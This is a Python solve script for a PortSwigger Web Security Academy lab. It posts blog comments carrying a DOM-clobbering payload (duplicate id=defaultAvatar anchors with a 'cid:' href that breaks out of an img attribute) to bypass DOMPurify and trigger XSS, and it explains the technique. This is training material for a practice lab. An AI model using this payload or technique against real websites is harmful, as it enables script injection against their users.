#!/usr/bin/env python3
"""
Exploiting DOM clobbering to enable XSS
PortSwigger Web Security Academy -- DOM-Based Vulnerabilities

Companion script for the writeup: 06-dom-clobbering-xss.md

What this does:
    Posts two comments to a blog post. The first is the clobbering payload --
    two anchors sharing `id=defaultAvatar`, the second carrying
    `name=avatar href="cid:&quot;onerror=alert(1)//"` -- which overwrites the
    fallback `window.defaultAvatar || {...}` initializer with a DOM
    collection whose `.avatar` property resolves to that `href`. DOMPurify
    2.0.15 whitelists the `cid:` scheme, so it passes the payload through
    untouched; the embedded `&quot;` decodes to a literal `"` once used in the
    avatar `<img src="...">` markup and breaks out of the attribute. The
    clobbering only takes effect on the *next* render, so a second, unrelated
    comment is posted purely to force the page to re-render its comment list
    (and read the now-clobbered global). Because the payload fires as soon as
    that re-render happens -- no exploit-server delivery or attacker-side
    browser step needed -- the solve is confirmed straight away by polling the
    lab's home page for the "Congratulations" banner.

Usage:
    python 06-dom-clobbering-xss.py <lab-url>
    e.g. python 06-dom-clobbering-xss.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import re
import sys
import time
import httpx


def find_blog_post(client, lab_url):
    r = client.get(lab_url)
    m = re.search(r'href="(/post\?postId=\d+)"', r.text)
    return m.group(1) if m else None


def get_csrf(client, post_url):
    r = client.get(post_url)
    m = re.search(r'name="csrf"\s+value="([^"]+)"', r.text)
    return m.group(1) if m else ""


def post_comment(client, post_url, post_id, comment, name, email):
    csrf = get_csrf(client, post_url)
    client.post(
        "/post/comment",
        data={"csrf": csrf, "postId": post_id, "comment": comment, "name": name, "email": email, "website": ""},
        headers={"Content-Type": "application/x-www-form-urlencoded"},
    )


def solve(lab_url: str) -> None:
    client = httpx.Client(base_url=lab_url, follow_redirects=True, timeout=15)

    post_path = find_blog_post(client, lab_url)
    if not post_path:
        print("[-] Could not find a blog post link on the home page.")
        return
    post_id = post_path.split("=")[-1]
    print(f"[*] Found post: {post_path}")

    # craft_dom_clobbering_comment() -- dual anchors with id=defaultAvatar create an
    # HTMLCollection; the second anchor's name=avatar clobbers .avatar with its href.
    clobber_html = '<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">'
    post_comment(client, post_path, post_id, clobber_html, "attacker", "attacker@evil.com")
    print("[*] Comment 1 (clobbering payload) posted")
    time.sleep(2)

    # Second comment only exists to force a fresh render of the comment list --
    # the clobbered avatar is read during that render, not retroactively.
    post_comment(client, post_path, post_id, "Trigger comment", "attacker2", "attacker2@evil.com")
    print("[*] Comment 2 (trigger) posted")

    time.sleep(5)
    check = client.get(lab_url)
    if "congratulations" in check.text.lower():
        print("[+] Lab solved -- clobbered window.defaultAvatar.avatar broke out of the img src attribute.")
    else:
        print("[-] Not solved yet -- re-fetch the post page in a browser to confirm the avatar renders.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
